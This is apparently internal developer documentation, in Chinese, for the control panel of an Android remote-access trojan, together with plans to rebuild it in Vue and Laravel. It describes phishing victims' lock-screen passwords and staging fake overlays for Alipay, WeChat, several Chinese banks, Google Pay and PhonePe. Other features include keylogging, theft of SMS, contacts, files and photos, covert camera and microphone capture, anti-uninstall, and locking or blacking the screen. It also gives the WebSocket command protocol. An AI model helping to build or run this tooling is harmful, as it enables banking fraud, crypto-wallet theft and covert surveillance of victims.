# 设备控制面板 (info.php) 技术文档

> 本文档详细描述旧版设备控制面板的架构、功能和通信协议。

## 概述

`docs/info.php` 是一个单页 Web 应用，用于远程控制和监控 Android 设备。采用 WebSocket 实现实时双向通信。

### 技术栈

| 组件 | 技术 |
|------|------|
| 前端框架 | 原生 JavaScript (ES6+) |
| UI 样式 | 内联 CSS + CSS Variables |
| 图标库 | Font Awesome 6.4 |
| 字体 | JetBrains Mono + Noto Sans SC |
| 通信协议 | WebSocket (WSS) |
| 本地存储 | IndexedDB (缩略图缓存) |

---

## 功能模块

### 1. 设备信息面板

显示设备基本信息：

| 字段 | 数据源 | 说明 |
|------|--------|------|
| ID | `phoneId` | 设备唯一标识 (22位) |
| 备注 | `phone_name` | 用户自定义名称 |
| 型号 | `model` | 设备型号 |
| 版本 | `android_version` | Android 版本 |
| 号码 | `phone_number` | SIM 卡号码 |
| IP | `address` | 设备 IP 地址 |
| 密码 | `phone_password` | 钓鱼获取的密码 |
| 电量 | `battery_charge` | 电池百分比 |
| 无障碍 | `accessibility` | 无障碍服务状态 |
| 心跳 | `lastPing` | 最后心跳时间 |

### 2. 实时投屏

支持三种模式：

| 模式 | 代码 | 说明 |
|------|------|------|
| 截图模式 | `SM` | 定时截图，低带宽 |
| 投屏模式 | `SN` | 实时视频流 |
| 文字识别 | `SK` | OCR 文字辅助 |

**触控交互：**
- 单击：`movetype: '0'`
- 滑动：`movetype: '1'` (路径格式: `(x1,y1):(x2,y2):...`)
- 长按：`movetype: '2'`

### 3. 快捷操作

| 功能 | 命令 | 参数 |
|------|------|------|
| 点亮屏幕 | `nav` | `navshort: 'ho'` |
| 返回 | `nav` | `navshort: 'bak'` |
| 主页 | `nav` | `navshort: 'ho'` |
| 多任务 | `nav` | `navshort: 'rec'` |
| 锁定设备 | `L` | `lockit: '0'` |
| 解锁设备 | `L` | `lockit: '1'` |
| 清除密码 | `L` | `lockit: '2'` |
| 禁用人脸 | `L` | `lockit: '3'` |
| 静音 | `vol` | `volstate: '0'` |
| 取消静音 | `vol` | `volstate: '1'` |
| 防卸载 | `kb` | `kbstate: '2'` |
| 可卸载 | `kb` | `kbstate: '3'` |
| 黑屏 | `block` | `bstate: '0'` |
| 取消黑屏 | `block` | `bstate: '1'` |
| 阻止操作 | `block` | `bstate: '2'` |
| 允许操作 | `block` | `bstate: '3'` |

### 4. 快捷应用

预定义的应用包名映射：

```javascript
const quickAppMap = {
    'TP': { pkg: 'vip.mytokenpocket', name: 'TokenPocket' },
    'IM': { pkg: 'im.token.app', name: 'imToken' },
    'TG': { pkg: 'org.telegram.messenger', name: 'Telegram' },
    'OneKey': { pkg: 'so.onekey.app.wallet', name: 'OneKey' },
    '波宝': { pkg: 'com.tronlinkpro.wallet', name: '波宝Pro' },
    '支': { pkg: 'com.eg.android.AlipayGphone', name: '支付宝' },
    '微': { pkg: 'com.tencent.mm', name: '微信' }
};
```

### 5. 钓鱼功能

**密码钓鱼类型：**

| 类型 | 值 | 说明 |
|------|-----|------|
| 自由选择 | `0` | 用户选择密码类型 |
| 图案密码 | `1` | 壁纸图案密码 |
| 数字密码 | `2` | 壁纸数字密码 |
| 混合密码 | `3` | 壁纸混合密码 |

**银行/支付钓鱼：**

| 代码 | 目标 |
|------|------|
| `a` | 支付宝 |
| `w` | 微信 |
| `yun` | 云闪付 |
| `jian` | 建设银行 |
| `you` | 邮储银行 |
| `nong` | 农业银行 |
| `zhong` | 中国银行 |
| `gong` | 工商银行 |
| `zhao` | 招商银行 |
| `gpay` | Google Pay |
| `phonepe` | PhonePe |
| `bc` | BC |
| `mb` | MB |

### 6. 键盘记录

- **实时监控**：开启后实时接收键盘输入
- **历史查询**：按日期查询服务器存储的记录
- **搜索功能**：关键词搜索历史记录
- **去重机制**：1分钟内相同内容不重复保存

API 端点：`/api/KeylogSave.php`

### 7. 短信管理

- 获取设备短信列表
- 发送短信到指定号码

### 8. 联系人

- 获取设备联系人列表
- 自动去重（按姓名+号码）

### 9. 应用管理

| 操作 | 命令 | 说明 |
|------|------|------|
| 获取列表 | `LOADAPPS` | 获取已安装应用 |
| 打开应用 | `OPENAPP` | 启动指定包名应用 |
| 卸载应用 | `UNINSTALLAPP` | 卸载指定应用 |
| 注入文件 | `changefiles` | 向应用注入文件 |
| 发送弹窗 | `bc` | 发送通知弹窗 |

### 10. 注入记录

查看应用注入历史，数据格式：
```
[HTML]注入页面||[PKG]包名||[LOG]日志内容
```

### 11. 文件管理

**预设目录：**
- SD卡：`/sdcard/`
- Pictures：`/sdcard/Pictures/`
- DCIM：`/sdcard/DCIM/`

**文件数据格式：**
```
[>D<] 分隔符
[>A<] 字段分隔：[0]?|[1]?|[2]文件名|[3]大小|[4]路径|[5]日期
```

### 12. 相册功能

**目录映射：**

| 类型 | 路径 |
|------|------|
| 相机照片 | `/sdcard/DCIM/Camera/` |
| 图片 | `/sdcard/Pictures/` |
| 截图 | `/sdcard/Pictures/Screenshots/` |
| 全部 | `/sdcard/DCIM/` |

**缩略图缓存：**
- 使用 IndexedDB 存储
- 数据库名：`GalleryThumbCache`
- 存储格式：`{ path, data, time }`
- 前端压缩：Canvas 压缩到 150px

**一键展示功能：**
- 批量加载所有缩略图
- 支持缓存优先加载
- 侧边预览面板
- 全屏预览模式

### 13. 相机监控

| 操作 | 命令 | 参数 |
|------|------|------|
| 开启 | `cam` | `SelectedCam: 'front'/'back'` |
| 关闭 | `camoff` | - |

### 14. 录音监控

| 操作 | 命令 |
|------|------|
| 开启 | `mic` |
| 关闭 | `micoff` |

---

## WebSocket 通信协议

### 连接地址

```javascript
ws = new WebSocket(`wss://${location.host}/api/ws/`);
```

### 消息格式

**发送消息：**
```javascript
{
    pid: "设备ID",
    itype: "消息类型",  // slr_panel | slr_panelsend
    subc: "子命令",
    ...其他参数
}
```

**接收消息类型：**

| type | 说明 | 数据字段 |
|------|------|----------|
| `statusBatch` | 设备状态 | `phoneInfo`, `serverToPhone`, `lastPing` |
| `screen` | 文字辅助画面 | `data`, `wmob`, `hmob` |
| `screenshot` | 投屏/截图 | `data`, `wmob`, `hmob` |
| `klog` | 实时键盘记录 | `data` |
| `klogsdate` | 历史键盘记录 | `data` |
| `sms` | 短信列表 | `data` (JSON lines) |
| `loadcontacts` | 联系人列表 | `data` (JSON lines) |
| `loadapps` | 应用列表 | `data` (JSON: `{apps:[]}`) |
| `injapps` | 注入记录 | `data` |
| `files` | 文件列表 | `data` |
| `down` | 文件下载分块 | `filename`, `filedata`, `totalSize`, `sentSize`, `chunkNumber`, `filehash` |
| `savefiles` | 文件数据 | `data` (JSON: `{fileName, fileContent}`) |
| `thumb` | 缩略图 | `data`, `path` |
| `snap` | 快照 | `data` |
| `cam` | 相机画面 | `data` |
| `mic` | 录音数据 | `data` |

### 心跳机制

```javascript
setInterval(() => {
    ws.send(JSON.stringify({ 
        pid: phoneId, 
        itype: 'slr_panel', 
        subc: 'ping' 
    }));
}, 5000);
```

### 加入房间

```javascript
ws.send(JSON.stringify({ 
    pid: phoneId, 
    itype: 'slr_panel', 
    subc: 'join', 
    usercheck: '' 
}));
```

---

## 状态管理

### 全局变量

```javascript
let ws = null;                    // WebSocket 连接
const phoneId = "设备ID";          // 当前设备
const apiToken = "API令牌";        // API 认证
let screenW = 1080, screenH = 1920; // 屏幕尺寸
let phoneInfo = null;             // 设备信息
let deviceOnline = false;         // 在线状态
let screenRunning = false;        // 投屏状态
let currentScreenMode = null;     // 当前投屏模式
let keylogActive = false;         // 键盘记录状态
let textAssistActive = false;     // 文字辅助状态
let galleryCache = [];            // 相册缓存
let appsCache = [];               // 应用缓存
let smsCache = [];                // 短信缓存
let contactsCache = [];           // 联系人缓存
```

### 本地存储

- `keylog_active_{phoneId}`：键盘记录开关状态

---

## UI 组件

### CSS 变量

```css
:root {
    --bg-primary: #0d0d12;
    --bg-secondary: #13131a;
    --bg-card: #1a1a24;
    --bg-hover: #22222e;
    --border: #2d2d3a;
    --text: #e8e8ed;
    --text-secondary: #9090a0;
    --text-muted: #606070;
    --accent: #00d4ff;
    --accent-purple: #a855f7;
    --success: #22c55e;
    --warning: #f59e0b;
    --danger: #ef4444;
}
```

### 响应式断点

- `1200px`：隐藏侧边栏，单列布局
- `900px`：预览面板居中
- `768px`：操作按钮网格调整

---

## 安全注意事项

1. **API Token**：硬编码在前端，仅用于内部 API 认证
2. **WebSocket**：使用 WSS 加密传输
3. **文件下载**：通过 `pendingDownloadFile` 标记防止意外下载
4. **页面关闭**：自动停止投屏、相机、录音流

---

## 迁移建议

此文件为旧版实现，新版系统应：

1. 使用 Vue 3 + Inertia.js 重构
2. 将 WebSocket 逻辑迁移到 Composables
3. 使用 Naive UI 组件替代自定义样式
4. 将 API 调用迁移到 Laravel 后端
5. 实现更完善的错误处理和重连机制

参考文档：
- [FRONTEND.md](../migration/FRONTEND.md) - 新版前端架构
- [WEBSOCKET_CLIENT.md](../migration/WEBSOCKET_CLIENT.md) - WebSocket 客户端实现
